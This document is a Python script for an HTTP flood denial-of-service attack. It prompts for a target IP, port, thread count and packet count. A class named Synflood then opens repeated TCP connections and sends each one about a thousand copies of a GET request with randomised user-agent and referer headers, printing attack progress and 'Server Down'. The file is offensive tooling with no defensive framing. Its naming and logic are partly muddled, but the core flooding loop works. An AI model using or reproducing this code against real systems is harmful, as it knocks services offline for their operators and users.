#!/usr/bin/python3

import socket
import random
import threading

choose = input('')

def ping():
    return 'online'

def slowloris():
    pass

class Synflood:
    def __init__(self, ip, port, packet):
        self.useragents = [
            "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
            "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
            "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
            "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"
        ]
        self.ref = [
            'http://www.bing.com/search?q=',
            'https://www.yandex.com/yandsearch?text=',
            'https://duckduckgo.com/?q='
        ]
        self.acceptall = [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept-Language: en-US,en;q=0.5\r\n"
        ]
        self.pack = 1000
        #self.ppm = int(input('ppm'))
        self.ip = ip
        self.port = port
        self.packet = packet
    def start(self, port="80", ip="localhost"):
        hh = random._urandom(3016)
        xx = int(0)
        #tot = int(input('total packets: '))
        useragen = "User-Agent: " + random.choice(self.useragents) + "\r\n"
        accept = random.choice(self.acceptall)
        reffer = "Referer: " + random.choice(self.ref) + str(self.ip) + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\n"
        length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
        target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
        main_req = target_host + useragen + accept + reffer + content + length + "\r\n"
        for _ in range(self.packet):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(self.ip), int(self.port)))
                s.send(str.encode(main_req))
                for _ in range(self.pack):
                    s.send(str.encode(main_req))
                xx += random.randint(0, int(self.packet))
                print("[+] Attacking {0}:{1} | Sent: {2}".format(str(self.ip), int(self.port), xx))
            except:
                s.close()
                print('[+] Server Down.')
        exit()

if choose == '1':
    ip = input('')
    port = int(input(''))
    #syn = Synflood(ip, port)
    threadd = int(input(''))
    packet = int(input(''))
    syn = Synflood(ip, port, packet)
    for i in range(threadd):
        x = threading.Thread(target=syn.start)
        x.start()
        exit()
if choose == '2':
    pass
if choose == '3':
    print('online')
